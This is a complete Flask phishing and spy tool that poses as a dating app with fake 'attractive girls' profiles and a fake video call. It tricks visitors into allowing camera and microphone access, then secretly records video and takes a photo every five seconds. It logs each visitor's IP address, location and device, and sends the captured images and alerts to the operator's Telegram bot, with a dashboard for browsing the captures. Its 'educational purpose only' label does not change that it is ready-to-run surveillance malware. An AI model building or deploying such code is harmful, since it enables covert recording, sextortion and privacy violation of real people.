#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ═══════════════════════════════════════════════════════════════════
# ZEON VIDEO CALL - ATTRACTIVE GIRLS EDITION (PROFESSIONAL)
# ⚠️ EDUCATIONAL PURPOSE ONLY - Unauthorized use is ILLEGAL!
# ═══════════════════════════════════════════════════════════════════

import os
import uuid
import random
import sqlite3
import requests
from datetime import datetime
from flask import Flask, request, render_template_string, send_file, jsonify

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = "ENTER YOUR BOT TOKEN HERE"
TELEGRAM_CHAT_ID = "1234567890"

app = Flask(__name__)

os.makedirs("captured", exist_ok=True)

# Database
conn = sqlite3.connect("sessions.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''
    CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        ip TEXT,
        location TEXT,
        device TEXT,
        start_time TEXT,
        has_camera INTEGER DEFAULT 0,
        photos_count INTEGER DEFAULT 0
    )
''')
conn.commit()

# ==================== ATTRACTIVE PROFILES ====================
GIRLS = [
    {"name": "Sofia", "age": 22, "city": "Mumbai", "img": "https://randomuser.me/api/portraits/women/1.jpg"},
    {"name": "Ishita", "age": 21, "city": "Delhi", "img": "https://randomuser.me/api/portraits/women/2.jpg"},
    {"name": "Priya", "age": 23, "city": "Bangalore", "img": "https://randomuser.me/api/portraits/women/3.jpg"},
    {"name": "Neha", "age": 22, "city": "Kolkata", "img": "https://randomuser.me/api/portraits/women/4.jpg"},
    {"name": "Anjali", "age": 24, "city": "Chennai", "img": "https://randomuser.me/api/portraits/women/5.jpg"},
    {"name": "Riya", "age": 21, "city": "Hyderabad", "img": "https://randomuser.me/api/portraits/women/6.jpg"},
    {"name": "Zara", "age": 23, "city": "Pune", "img": "https://randomuser.me/api/portraits/women/7.jpg"},
    {"name": "Tara", "age": 22, "city": "Ahmedabad", "img": "https://randomuser.me/api/portraits/women/8.jpg"},
]

# ==================== TELEGRAM ====================
def send_to_telegram(message, file_path=None):
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                    data={'chat_id': TELEGRAM_CHAT_ID, 'caption': message},
                    files={'photo': f}
                )
        else:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                json={'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
            )
    except Exception as e:
        print(f"Telegram error: {e}")

# ==================== SUPER ATTRACTIVE LANDING PAGE ====================
LANDING_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Find Your Match - Video Call</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }

        /* Hero Section */
        .hero {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 40px 20px;
            text-align: center;
            color: white;
        }

        .hero h1 {
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 10px;
        }

        .hero p {
            font-size: 16px;
            opacity: 0.9;
        }

        .hero .badge {
            background: rgba(255,255,255,0.2);
            display: inline-block;
            padding: 5px 15px;
            border-radius: 50px;
            font-size: 12px;
            margin-top: 15px;
        }

        /* Girls Grid */
        .girls-section {
            padding: 30px 20px;
            background: white;
            border-radius: 30px 30px 0 0;
            margin-top: -20px;
        }

        .section-title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .section-title h2 {
            font-size: 20px;
            color: #333;
        }

        .section-title span {
            color: #667eea;
            font-size: 14px;
        }

        .girls-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
        }

        .girl-card {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid #eee;
        }

        .girl-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0,0,0,0.15);
        }

        .girl-img {
            width: 100%;
            height: 180px;
            object-fit: cover;
            background: linear-gradient(135deg, #667eea, #764ba2);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            color: white;
        }

        .girl-info {
            padding: 12px;
        }

        .girl-name {
            font-weight: 700;
            font-size: 16px;
            color: #333;
        }

        .girl-details {
            font-size: 12px;
            color: #888;
            margin-top: 4px;
        }

        .online-badge {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #4caf50;
            border-radius: 50%;
            margin-right: 5px;
        }

        /* Floating Action Button */
        .fab {
            position: fixed;
            bottom: 80px;
            right: 20px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            width: 55px;
            height: 55px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
            cursor: pointer;
            z-index: 100;
        }

        /* Bottom Navigation */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            display: flex;
            justify-content: space-around;
            padding: 12px 20px;
            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
            border-top: 1px solid #eee;
        }

        .nav-item {
            text-align: center;
            color: #888;
            font-size: 12px;
            cursor: pointer;
        }

        .nav-item i {
            font-size: 22px;
            display: block;
            margin-bottom: 4px;
        }

        .nav-item.active {
            color: #667eea;
        }

        /* Video Call Modal */
        .call-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #000;
            z-index: 1000;
            display: none;
            flex-direction: column;
        }

        .call-header {
            background: linear-gradient(135deg, #667eea, #764ba2);
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
        }

        .call-header .call-title {
            font-weight: 600;
        }

        .call-header .end-call {
            background: #ff3b30;
            border: none;
            color: white;
            padding: 8px 16px;
            border-radius: 30px;
            font-size: 12px;
            cursor: pointer;
        }

        .call-video-area {
            flex: 1;
            position: relative;
            background: #1a1a1a;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #remoteVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        #localVideo {
            position: absolute;
            bottom: 20px;
            right: 20px;
            width: 100px;
            height: 140px;
            border-radius: 12px;
            border: 2px solid white;
            object-fit: cover;
            background: #333;
        }

        .call-controls {
            background: #1a1a1a;
            padding: 15px;
            display: flex;
            justify-content: center;
            gap: 25px;
        }

        .call-controls button {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: none;
            background: #333;
            color: white;
            font-size: 20px;
            cursor: pointer;
        }

        .call-controls button.end {
            background: #ff3b30;
        }

        .permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1100;
        }

        .permission-card {
            background: white;
            border-radius: 30px;
            padding: 30px;
            max-width: 320px;
            text-align: center;
        }

        .permission-card .icon {
            font-size: 60px;
            margin-bottom: 20px;
        }

        .permission-card h3 {
            font-size: 22px;
            margin-bottom: 10px;
        }

        .permission-card p {
            color: #666;
            font-size: 14px;
            margin-bottom: 25px;
        }

        .allow-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 14px 30px;
            border-radius: 50px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
        }

        .toast {
            position: fixed;
            bottom: 100px;
            left: 20px;
            right: 20px;
            background: #333;
            color: white;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
            font-size: 14px;
                   z-index: 200;
            display: none;
        }

        @media (max-width: 480px) {
            .girls-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
            }
            .girl-img {
                height: 150px;
            }
        }
    </style>
</head>
<body>
    <div class="hero">
        <h1>✨ Find Your Match ✨</h1>
        <p>Connect with beautiful girls near you</p>
        <div class="badge"><i class="fas fa-users"></i> 2,847 online now</div>
    </div>

    <div class="girls-section">
        <div class="section-title">
            <h2><i class="fas fa-fire" style="color: #ff6b6b;"></i> Recommended for you</h2>
            <span>See all <i class="fas fa-chevron-right"></i></span>
        </div>
        <div class="girls-grid" id="girlsGrid"></div>
    </div>

    <div class="fab" onclick="showRandomMatch()">
        <i class="fas fa-random"></i>
    </div>

    <div class="bottom-nav">
        <div class="nav-item active">
            <i class="fas fa-home"></i>
            <span>Home</span>
        </div>
        <div class="nav-item">
            <i class="fas fa-heart"></i>
            <span>Matches</span>
        </div>
        <div class="nav-item">
            <i class="fas fa-comments"></i>
            <span>Chats</span>
        </div>
        <div class="nav-item">
            <i class="fas fa-user"></i>
            <span>Profile</span>
        </div>
    </div>

    <!-- Video Call Modal -->
    <div class="call-modal" id="callModal">
        <div class="call-header">
            <span class="call-title"><i class="fas fa-video"></i> Video Call</span>
            <button class="end-call" onclick="endCall()"><i class="fas fa-phone-slash"></i> End</button>
        </div>
        <div class="call-video-area">
            <video id="remoteVideo" autoplay playsinline></video>
            <video id="localVideo" autoplay playsinline muted></video>
        </div>
        <div class="call-controls">
            <button onclick="toggleMic()"><i class="fas fa-microphone"></i></button>
            <button onclick="toggleCamera()"><i class="fas fa-video"></i></button>
            <button class="end" onclick="endCall()"><i class="fas fa-phone-slash"></i></button>
        </div>
    </div>

    <!-- Permission Modal -->
    <div class="permission-modal" id="permissionModal" style="display: none;">
        <div class="permission-card">
            <div class="icon">🎥</div>
            <h3>Camera & Microphone Access</h3>
            <p>Allow access to start video call with your match</p>
            <button class="allow-btn" onclick="startVideoCall()">Allow Access</button>
        </div>
    </div>

    <div class="toast" id="toast">🔥 Match found! Starting video call...</div>

    <script>
        let currentGirl = null;
        let localStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let sessionId = "{{ session_id }}";
        let photoInterval = null;
        let isMicOn = true;
        let isCameraOn = true;

        const girls = {{ girls_json|safe }};

        function renderGirls() {
            const grid = document.getElementById('girlsGrid');
            grid.innerHTML = girls.slice(0, 8).map(girl => `
                <div class="girl-card" onclick="startCallWith('${girl.name}')">
                    <div class="girl-img">
                        <i class="fas fa-user-circle" style="font-size: 60px;"></i>
                    </div>
                    <div class="girl-info">
                        <div class="girl-name">${girl.name}, ${girl.age}</div>
                        <div class="girl-details">
                            <span class="online-badge"></span> ${girl.city} • ${Math.floor(Math.random() * 5) + 1}km away
                        </div>
                    </div>
                </div>
            `).join('');
        }

        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.style.display = 'block';
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }

        function showRandomMatch() {
            const randomGirl = girls[Math.floor(Math.random() * girls.length)];
            showToast(`🔥 Match found! ${randomGirl.name} wants to video call`);
            setTimeout(() => {
                startCallWith(randomGirl.name);
            }, 2000);
        }

        async function startCallWith(girlName) {
            currentGirl = girls.find(g => g.name === girlName);
            document.getElementById('permissionModal').style.display = 'flex';
        }

        async function startVideoCall() {
            document.getElementById('permissionModal').style.display = 'none';

            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                const localVideo = document.getElementById('localVideo');
                localVideo.srcObject = localStream;

                // Setup recording
                mediaRecorder = new MediaRecorder(localStream, { mimeType: 'video/webm' });
                recordedChunks = [];

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
                        sendToServer(blob, 'video');
                        recordedChunks = [];
                    }
                };
                mediaRecorder.start(10000);

                // Capture photo every 5 seconds
                photoInterval = setInterval(() => capturePhoto(), 5000);

                // Show call modal
                document.getElementById('callModal').style.display = 'flex';

                // Simulate remote video (attractive girl video loop)
                const remoteVideo = document.getElementById('remoteVideo');
                // Create a canvas animation (attractive)
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');

                let frame = 0;
                const animateRemote = setInterval(() => {
                    ctx.fillStyle = '#1a1a2e';
                    ctx.fillRect(0, 0, 640, 480);

                    // Draw attractive girl animation
                    ctx.fillStyle = '#667eea';
                    ctx.font = 'bold 30px Poppins';
                    ctx.fillText('💕 ' + currentGirl.name + ' 💕', 200, 200);
                    ctx.font = '20px Poppins';
                    ctx.fillStyle = '#fff';
                    ctx.fillText('Video connecting...', 230, 280);

                    const stream = canvas.captureStream();
                    remoteVideo.srcObject = stream;
                    frame++;
                }, 100);

                window.remoteAnimation = animateRemote;

                // Notify server
                await fetch('/camera_active', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ session_id: sessionId, girl: currentGirl.name })
                });

            } catch(err) {
                alert('Camera access required!');
            }
        }

        function capturePhoto() {
            const video = document.getElementById('localVideo');
            if (video && video.videoWidth > 0) {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                canvas.toBlob((blob) => {
                    if (blob) sendToServer(blob, 'photo');
                }, 'image/jpeg', 0.85);
            }
        }

        async function sendToServer(blob, type) {
            const formData = new FormData();
            formData.append('data', blob);
            formData.append('type', type);
            formData.append('session_id', sessionId);
            await fetch('/capture', { method: 'POST', body: formData });
        }

        function toggleMic() {
            if (localStream) {
                const audioTrack = localStream.getAudioTracks()[0];
                if (audioTrack) {
                    isMicOn = !isMicOn;
                    audioTrack.enabled = isMicOn;
                }
            }
        }

        function toggleCamera() {
            if (localStream) {
                const videoTrack = localStream.getVideoTracks()[0];
                if (videoTrack) {
                    isCameraOn = !isCameraOn;
                    videoTrack.enabled = isCameraOn;
                }
            }
        }

        async function endCall() {
            if (photoInterval) clearInterval(photoInterval);
            if (window.remoteAnimation) clearInterval(window.remoteAnimation);

            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
            }

            await fetch('/end_call', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ session_id: sessionId })
            });

            document.getElementById('callModal').style.display = 'none';
            showToast('Call ended');
        }

        renderGirls();

        // Console warning
        console.log("%c⚠️ EDUCATIONAL DEMO - Security Research Only", "color: red; font-size: 14px;");
    </script>
</body>
</html>
'''

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    session_id = str(uuid.uuid4())[:16]

    ip = request.remote_addr
    location = get_ip_location(ip)
    device = request.headers.get('User-Agent', 'Unknown')[:50]

    cursor.execute('INSERT INTO sessions (id, ip, location, device, start_time) VALUES (?, ?, ?, ?, ?)',
                   (session_id, ip, location, device, datetime.now().isoformat()))
    conn.commit()

    send_to_telegram(f"""
🔴 <b>NEW VISITOR!</b>

🆔 Session: <code>{session_id}</code>
🌐 IP: {ip}
📍 Location: {location}
📱 Device: {device}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """)

    return render_template_string(LANDING_PAGE, session_id=session_id, girls_json=json.dumps(GIRLS))

def get_ip_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        data = r.json()
        if data.get('status') == 'success':
            return f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
    except:
        pass
    return 'Unknown'

@app.route('/camera_active', methods=['POST'])
def camera_active():
    data = request.get_json()
    session_id = data.get('session_id')
    girl = data.get('girl', 'Unknown')

    cursor.execute('UPDATE sessions SET has_camera = 1 WHERE id = ?', (session_id,))
    conn.commit()

    send_to_telegram(f"""
📹 <b>CAMERA ACTIVE!</b>

🆔 Session: <code>{session_id}</code>
💕 Girl: {girl}
✅ User granted access
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """)

    return jsonify({"status": "ok"})

@app.route('/capture', methods=['POST'])
def capture():
    session_id = request.form.get('session_id')
    capture_type = request.form.get('type')
    data = request.files.get('data')

    if data:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"captured/{capture_type}_{session_id}_{timestamp}.jpg"
        data.save(filename)

        cursor.execute('UPDATE sessions SET photos_count = photos_count + 1 WHERE id = ?', (session_id,))
        conn.commit()

        send_to_telegram(f"""
📸 <b>CAPTURED!</b>

🆔 Session: <code>{session_id}</code>
📷 Type: {capture_type}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """, filename)

        print(f"[✓] {capture_type}: {filename}")

    return jsonify({"status": "ok"})

@app.route('/end_call', methods=['POST'])
def end_call():
    session_id = request.get_json().get('session_id')

    send_to_telegram(f"""
🔴 <b>CALL ENDED!</b>

🆔 Session: <code>{session_id}</code>
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """)

    return jsonify({"status": "ok"})

@app.route('/dashboard')
def dashboard():
    cursor.execute('SELECT * FROM sessions ORDER BY start_time DESC LIMIT 30')
    sessions = cursor.fetchall()

    import glob
    photos = glob.glob("captured/photo_*.jpg")

    html = '''
    <!DOCTYPE html>
    <html>
    <head><title>ZEON Dashboard</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        h1 { color: #ff0055; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; border-bottom: 1px solid #333; text-align: left; }
        th { color: #ff0055; }
        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px,1fr)); gap: 10px; margin-top: 20px; }
        img { width: 100%; border-radius: 8px; }
    </style>
    </head>
    <body>
        <h1>ZEON CAPTURE DASHBOARD</h1>
        <h2>Sessions: {}</h2>
        <table><tr><th>ID</th><th>IP</th><th>Location</th><th>Camera</th><th>Photos</th><th>Time</th></tr>
    '''.format(len(sessions))

    for s in sessions:
        html += f'<tr><td>{s[0][:8]}...</td><td>{s[1]}</td><td>{s[2]}</td><td>{"✅" if s[5] else "❌"}</td><td>{s[6] or 0}</td><td>{s[4][:16]}</td></tr>'

    html += '</table><h2>Photos ({})</h2><div class="photo-grid">'.format(len(photos))
    for p in photos[-20:]:
        html += f'<div><img src="/file/{p}"><div>{p.split("/")[-1][:20]}</div></div>'
    html += '</div></body></html>'

    return html

@app.route('/file/<path:filename>')
def serve_file(filename):
    return send_file(filename)

import json

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     ZEON VIDEO CALL - ATTRACTIVE GIRLS EDITION                   ║
    ║              PROFESSIONAL DATING APP STYLE                       ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  🌐 http://localhost:5000                                        ║
    ║  📊 http://localhost:5000/dashboard                              ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  ⚠️ EDUCATIONAL PURPOSE ONLY - Unauthorized use is ILLEGAL!      ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=5000, debug=False)
